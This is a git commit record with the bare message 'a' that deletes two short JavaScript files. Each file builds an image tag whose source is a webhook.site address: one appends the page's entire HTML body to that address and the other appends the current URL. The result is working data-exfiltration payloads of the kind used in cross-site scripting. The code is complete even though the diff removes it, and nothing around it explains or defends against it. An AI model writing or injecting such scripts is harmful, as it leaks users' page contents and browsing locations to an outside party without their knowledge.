9b420cf9291a3cbc2ac0a7ddb8750c20aad6464c
carloszavaleta <czavaleta93@gmail.com>
2020-01-21 11:28:40 -0600

    a

--- f.js
+++
@@ -1,6 +0,0 @@
-var image = document.createElement("img")
-
-var html = window.document.body.outerHTML
-image.src = "https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?c=" + html
-
-document.body.appendChild(image);
--- z.js
+++
@@ -1,6 +0,0 @@
-var image = document.createElement("img")
-
-var name = window.location.href
-image.src = "https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?c=" + name
-
-document.body.appendChild(image);
